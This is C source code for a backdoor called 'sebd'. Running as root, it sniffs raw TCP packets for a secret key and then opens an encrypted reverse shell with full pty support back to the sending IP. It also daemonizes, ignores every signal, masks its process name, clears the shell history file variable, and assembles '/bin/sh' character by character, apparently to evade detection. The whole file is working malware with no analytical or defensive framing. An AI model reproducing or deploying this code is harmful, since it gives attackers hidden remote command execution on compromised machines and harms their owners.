/* sebd.c - simple raw sniffer that starts an encrypted 
	    connect back shell with full pty support if 
	    the good password if found in the sniffed packet. */

#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <pty.h>
#include <termios.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "../include/pel.h"
#include "../include/struct.h"
#include "../include/config.h"
#include "../include/func.h"

char *secret = KEY;
                                                                                                                              
unsigned char message[BUFSIZE + 1];

int connect_back(unsigned int ip)
{
    int ret, len, pid, n;
    int client;
    struct sockaddr_in client_addr;
	                                                                                                                                  
    sleep(CONNECT_BACK_DELAY);
    
    client = socket( AF_INET, SOCK_STREAM, 0 );
    if(client < 0) {
	perror("socket");
	return 1;
    }
    
    client_addr.sin_family = AF_INET;
    client_addr.sin_port   = htons(SERVER_PORT);
    client_addr.sin_addr.s_addr = ip;

    ret = connect(client, (struct sockaddr *) &client_addr, sizeof(client_addr));
    if(ret < 0) {
	perror("connect");
	return 2;
    }

    alarm(3);
    ret = pel_server_init( client, secret );
    if(ret != PEL_SUCCESS) {
	shutdown( client, 2 );
	return 6;
    }
    alarm(0);

    ret = pel_recv_msg( client, message, &len );
    if(ret != PEL_SUCCESS || len != 1) {
	shutdown(client, 2);
	return 7;
    }
    
    ret = server_runshell(client);
    shutdown(client,2);
	                                                                                                                                  
    /* never reached */
    return 0;
}

int server_runshell(int client)
{
    fd_set rd;
    struct winsize ws;
    char *slave, *temp, *shell;
    int ret, len, pid, pty, tty,n;

    if(openpty(&pty, &tty, NULL, NULL, NULL) < 0) {
	perror("openpty");
	return 1;
    }
    slave = ttyname(tty);
    if(slave == NULL) {
	perror("ttyname");
	return 2;
    }

    temp = (char *) malloc(10);
    if(temp == NULL) {
	perror("malloc");
	return 3;
    }
    temp[0] = 'H'; temp[5] = 'I';
    temp[1] = 'I'; temp[6] = 'L';
    temp[2] = 'S'; temp[7] = 'E';
    temp[3] = 'T'; temp[8] = '=';
    temp[4] = 'F'; temp[9] = '\0';
    putenv(temp);

    ret = pel_recv_msg(client, message, &len);
    if(ret != PEL_SUCCESS) {
	return 4;
    }
    message[len] = '\0';
    
    temp = (char *) malloc( len + 6);
    if(temp == NULL) {
	perror("malloc");
	return 5;
    }
    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';
    strncpy(temp + 5, (char *) message, len + 1);
    putenv(temp);

    ret = pel_recv_msg(client, message, &len);
    if(ret != PEL_SUCCESS || len != 4) {
	return 6;
    }
    ws.ws_row = ((int) message[0] << 8) + (int) message[1];
    ws.ws_col = ((int) message[2] << 8) + (int) message[3];
    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;
    if(ioctl(pty, TIOCSWINSZ, &ws) < 0) {
	perror("ioctl");
	return 7;
    }

    ret = pel_recv_msg( client, message, &len);
    if(ret != PEL_SUCCESS) {
	return 8;
    }
    message[len] = '\0';
    temp = (char *) malloc( len + 1);
    if(temp == NULL) {
	perror("malloc");
	return 9;
    }
    strncpy(temp, (char *) message, len + 1);

    pid = fork();
    if(pid < 0) {
	perror("fork");
	return 10;
    }
    if(pid == 0) {
	//close(client);
	//close(pty);
	if(setsid() < 0) {
	    perror("setsid");
	    return 11;
	}
	if(ioctl( tty, TIOCSCTTY, NULL) < 0) {
	    perror("ioctl");
	    return 12;
	}
	dup2(tty, 0);
	dup2(tty, 1);
	dup2(tty, 2);
	if(tty > 2) {
	    close( tty );
	    }
	shell = (char *) malloc( 8 );
	if(shell == NULL) {
	    return 13;
	}
	shell[0] = '/'; shell[4] = '/';
	shell[1] = 'b'; shell[5] = 's';
	shell[2] = 'i'; shell[6] = 'h';
	shell[3] = 'n'; shell[7] = '\0';
	execl(shell, shell + 5, "-c", temp, (char *) 0);
	kill(pid, SIGKILL);
	
	/* never reached */                                                                                          
	return 14;
    }
    else {
	close(tty);
	                                                                                                                                  
	while(1) {
	    FD_ZERO(&rd);
	    FD_SET(client, &rd);
	    FD_SET(pty, &rd);
	
	    n = (pty > client) ? pty : client;
	    if(select(n + 1, &rd, NULL, NULL, NULL) < 0) {
		return 15;
	    }
	    
	    if(FD_ISSET(client, &rd)) {
		ret = pel_recv_msg(client, message, &len);
		if(ret != PEL_SUCCESS) {
		    return 16;
		}
		if(write(pty, message, len) != len) {
		    return 17;
		}
	    }
	    
	    if(FD_ISSET(pty, &rd))
	    {
		len = read(pty, message, BUFSIZE );
		if(len == 0) break;
		    if(len < 0) {
			return 18;
		    }
		    ret = pel_send_msg( client, message, len );
		    if(ret != PEL_SUCCESS) {
			return 19;
		    }
		}
	}
    }
    
    kill(pid, SIGKILL);
    /* never reached */
    return 20;
}

int daemonize()
{
    int session, descriptor, sig;
                                                                                                                                  
    session = setsid();
    if(session < 0) {
	perror("setsid");
	return 1;
    } 
				                                                                                                                              
    chdir("/");
				                                                                                                                                  
    descriptor = open("/dev/null", O_RDWR, 0);
    if(descriptor == -1) {
	perror("open");
	return 1;
    }
    dup2(descriptor, 0);
    dup2(descriptor, 1);
    dup2(descriptor, 2);
    close(descriptor);
										                                                                                                                              
    for(sig = 1; sig < 64; sig++) {
	signal(sig, SIG_IGN);
    }
												                                                                                                                              
    waitpid(-1, NULL, WNOHANG);
 												                                                                                                                                  
    return 0;
}

int wait_for_packet()
{
    int server, pid, length, receiver;
    struct sockaddr_in raw;
    struct ippacket packet;
    uid_t uid;
    FILE *cacat;
    char buff[1024];
    
    if(SILENT == 0) {
        printf("[sebd]-> starting\n");
    }

    uid = getuid();
    if(uid != 0) {
	fprintf(stderr, "error: you need to be root (your uid: %d) to run me\n", uid);
	return 1;
    }
    if(SILENT == 0) {
	printf("[sebd]-> checking uid...OK (uid=0)\n");
    }

    server = socket(AF_INET, SOCK_RAW, 6);
    if(server < 0) {
	perror("socket");
	return 2;
    }
    
    pid = fork();
    if(pid < 0) {
	perror("fork");
	return 3;
    }
    if(pid != 0) {
 		if((cacat=fopen(PIDFILE,"r"))!=NULL){
		     fgets(buff,4096,cacat);
		      if(atoi(buff) > 0){
	if(SILENT == 0)
		           printf("[sebd]-> Killing pid: %s",buff);
			   kill(atoi(buff),SIGKILL);
		      }
           	fclose(cacat);			
		}
	if(SILENT == 0)
	    printf("[sebd]-> forking...OK (pid=%d)\n", pid);
	    if((cacat=fopen(PIDFILE,"w"))==NULL){
	        printf("cannot log pid %d",pid);
	    }
	        else
	             {
	               fprintf(cacat,"%d\n",pid);
		if(SILENT == 0)
	               printf("[sebd]-> writing pid file..OK (%s)\n",PIDFILE);
		       fclose(cacat);
			}			    
	    
	if(SILENT == 0)
	    printf("[sebd]-> faking the proccess name..OK (%s)\n",MASK);
	
	    return 0; 

    } else {
   daemonize();
}

    while(1) {
	length = sizeof(raw);
	memset(&packet, 0, sizeof(packet));
	
	receiver = recvfrom(server, (struct ippacket *) &packet, sizeof(packet), 0, (struct sockaddr *)&raw, &length);
	if(receiver >= (sizeof(packet.ip) + sizeof(packet.tcp) + 12 + sizeof(KEY))) {
	    if(!strncmp(KEY, packet.data, sizeof(KEY))) {
		connect_back(raw.sin_addr.s_addr); 
	    }
	}
    }
    
    /* never reached */
    if(SILENT == 0) {
	printf("[sebd]-> waiting for packet...");
    }

    return 0;
}
		
int main(int argc,char *argv[])
{
        strcpy(argv[0],MASK);
  	wait_for_packet();
    
    return 0;
}

